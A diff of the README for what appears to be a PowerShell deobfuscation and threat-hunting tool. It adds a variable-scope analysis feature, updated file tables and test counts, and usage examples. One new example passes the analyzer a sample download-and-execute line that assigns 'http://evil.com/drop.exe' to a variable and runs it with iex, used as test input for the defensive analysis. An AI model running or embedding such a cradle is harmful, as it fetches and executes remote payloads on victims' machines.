@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/maya-thorne/powershell-ast-deobfuscator"><img src="https://img.shields.io/badge/Release-v0.16.0-blue.svg?style=flat-square" alt="Release v0.16.0" /></a>
+  <a href="https://github.com/maya-thorne/powershell-ast-deobfuscator"><img src="https://img.shields.io/badge/Release-v0.17.0-blue.svg?style=flat-square" alt="Release v0.17.0" /></a>
   <a href="LICENSE"><img src="https://img.shields.io/badge/License-MT--SRL-emerald.svg?style=flat-square" alt="License MT-SRL" /></a>
   <a href="ROADMAP.md"><img src="https://img.shields.io/badge/Roadmap-Active-purple.svg?style=flat-square" alt="Roadmap Active" /></a>
   <a href="SECURITY.md"><img src="https://img.shields.io/badge/Security-Policy-red.svg?style=flat-square" alt="Security Policy" /></a>
@@ -63,6 +63,7 @@ The deobfuscation engine executes a multi-pass fixed-point reduction loop:
 19. **Automated Benchmark Harness &amp; Telemetry (`src/benchmark.py`)**: Runs evaluation over a 30-sample corpus across 10 categories, calculating Shannon entropy, artifact removal, ground-truth indicator recall, and composite fidelity score.
 20. **YARA &amp; Sigma Threat Hunting Rule Synthesizer (`src/threat_rule_generator.py`)**: Extracts high-fidelity indicators (C2 URLs, AMSI/ETW hooks, memory injection APIs, execution cradles, persistence mechanisms) across raw and AST-deobfuscated payloads, synthesizing correlated YARA 4.x rules and SigmaHQ YAML detection rules targeting ScriptBlock Logging (EID 4104), Module Logging (EID 4103), and Process Creation (EID 4688).
 21. **In-Memory Compressed Stream Decompression (`src/compression_reducer.py`, `src/compression_decompressor.py`)**: Statically unpacks .NET in-memory compressed streams (`[IO.Compression.GZipStream]`, `[IO.Compression.DeflateStream]`, `BrotliStream`) wrapped around `[IO.MemoryStream]`, `[Convert]::FromBase64String`, byte arrays, and `[IO.StreamReader]::ReadToEnd()` or `[System.Text.Encoding]::GetString()`, resolving multi-step variable assignment chains, RFC 1951 raw deflate / RFC 1952 gzip payloads, multi-encoding auto-detection, and memory buffer zeroization.
+22. **Variable Scope Chain &amp; Lifecycle Analysis (`src/scope_chain.py`, `src/variable_scope_inliner.py`)**: Hierarchical scope frame management (Global, Script, Local, Private, Function, ScriptBlock), private variable boundary isolation, variable shadowing detection, Def-Use chain tracking, cmdlet-based variable mapping (`Set-Variable`, `Get-Variable`, `New-Variable`, `Clear-Variable`, `Remove-Variable`), constant propagation respecting lexical scopes, and side-effect-free dead variable assignment elimination.
 
 
 ---
@@ -122,6 +123,9 @@ The deobfuscation engine executes a multi-pass fixed-point reduction loop:
 | **In-Memory GZip Stream Unpacking** | `(New-Object IO.StreamReader(New-Object IO.Compression.GZipStream(New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sI...')), 1))).ReadToEnd()` | `Write-Output "Payload Decompressed"` |
 | **Raw Deflate Stream Unpacking** | `[System.Text.Encoding]::UTF8.GetString((New-Object IO.Compression.DeflateStream(New-Object IO.MemoryStream($rawBytes), 0)).ToArray())` | `Invoke-Expression 'Get-Process'` |
 | **Multi-Step Stream Assignment Reduction** | `$ms = New-Object IO.MemoryStream(,$bytes); $gz = New-Object IO.Compression.GZipStream($ms, 0); ...` | Consolidated inline string payload expression |
+| **Variable Scope Resolution** | `$global:k = 'payload'; & { $x = $global:k; $x }` | `'payload'` |
+| **Variable Cmdlet Unwrapping** | `Set-Variable -Name 'cmd' -Value 'iex'; Get-Variable cmd -ValueOnly` | `'iex'` |
+| **Scope Forensics &amp; Telemetry** | `pwsh-ast script.ps1 --scope-analysis` | Hierarchical scope tree, symbols table, def-use chains, and shadowing detection |
 
 ---
 
@@ -168,9 +172,14 @@ The deobfuscation engine executes a multi-pass fixed-point reduction loop:
 | `src/compression_decompressor.py` | RFC 1951 Deflate, RFC 1952 Gzip, Brotli decompressors, encoding heuristics & buffer zeroize |
 | `src/compression_reducer.py` | AST reducer for one-liner and multi-step .NET MemoryStream/GZipStream/DeflateStream pipelines |
 | `src/compression.py` | Public facade coordinating compressed stream AST reduction and telemetry tracing |
-| `src/deobfuscator_engine.py` | Multi-pass fixed-point convergence engine with AMSI/ETW bypass integration &amp; threat rule generation |
-| `src/cli.py` | Command-line interface with AST visualization, benchmark runner, URL carver, AMSI/ETW scanner, YARA/Sigma synthesizer &amp; forensic telemetry |
-| `tests/` | Comprehensive test suite (418 unit tests) covering lexer, parser, normalizer, crypto, URL carving, IEX peeling, AMSI/ETW detector, threat rules &amp; in-memory stream decompressor |
+| `src/scope_models.py` | Variable scope enums, symbol definitions, frame models, and telemetry summary schema |
+| `src/scope_chain.py` | Lexical &amp; runtime scope frame hierarchy, private variable isolation, and def-use chain tracking |
+| `src/variable_lifecycle_tracker.py` | AST traversal engine tracking assignments, reads, loops, functions, and variable cmdlets |
+| `src/variable_scope_inliner.py` | Scope-aware constant propagation, cmdlet unboxing &amp; dead variable elimination |
+| `src/variable_scope.py` | Unified public facade for variable scope analysis, constant inlining, and telemetry export |
+| `src/deobfuscator_engine.py` | Multi-pass fixed-point convergence engine with AMSI/ETW bypass integration, variable scope inlining &amp; threat rule generation |
+| `src/cli.py` | Command-line interface with AST visualization, benchmark runner, URL carver, AMSI/ETW scanner, scope analyzer, YARA/Sigma synthesizer &amp; forensic telemetry |
+| `tests/` | Comprehensive test suite (442 unit tests) covering lexer, parser, normalizer, crypto, URL carving, IEX peeling, AMSI/ETW detector, threat rules, compressed streams &amp; variable scope analysis |
 | `ROADMAP.md` | Public development milestones and engineering roadmap |
 | `SECURITY.md` | Vulnerability disclosure policy and reporting process |
 
@@ -394,11 +403,16 @@ metrics = extract_ast_metrics("Get-Process | Out-String")
 print(f"Total nodes: {metrics['total_nodes']}, Cyclomatic complexity: {metrics['cyclomatic_complexity']}")
 
 # 10. In-Memory Compressed Stream Decompression
-from src.compression import decompress_compressed_stream
 compressed_payload = "(New-Object IO.StreamReader(New-Object IO.Compression.GZipStream(New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAAAAAAAEAEvMS8kvKlEoycgsVgIA8aGg4wsAAAA=')), 1))).ReadToEnd()"
 unpacked_code = engine.deobfuscate(compressed_payload)
 print(unpacked_code)  # 'Hello Decompressed World'
 print(f"Decompressed {len(engine.last_compression_layers)} stream layers")
+
+# 11. Variable Scope Chain & Lifecycle Analysis
+from src.variable_scope import analyze_scopes, to_scope_report
+scope_summary = analyze_scopes("$global:url = 'http://evil.com/drop.exe'; & { $x = $global:url; iex $x }")
+print(to_scope_report(scope_summary))
+print(f"Total Scopes: {scope_summary.total_scopes}, Constant Candidates: {scope_summary.constant_candidates_count}")
 ```
 
 ---
